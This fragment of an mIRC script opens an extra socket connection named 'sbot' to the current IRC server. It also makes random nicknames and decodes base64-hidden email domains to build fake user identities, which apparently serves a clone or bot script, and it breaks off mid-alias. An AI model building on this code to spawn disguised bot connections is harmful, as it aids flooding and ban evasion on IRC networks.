   alias sbot { if ($sock(sbot).status == active) { halt } | .timer 1 3 .sockopen sbot $server 6669 }
   alias ssw { if ($sock($1).status == active) { sockwrite -n $1 $2- } }

   alias rnick { set %nn $rand(A,Z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) | return %nn }

   alias ruser { %v = $r(1,9)
     if (%v == 1) %v = $decode(aG90bWFpbC5jb20=,m) | if (%v == 2) %v = $decode(bGF0aW5tYWlsLmNvbQ==,m) | if (%v == 3) %v = $decode(eWFob28uY29t,m)
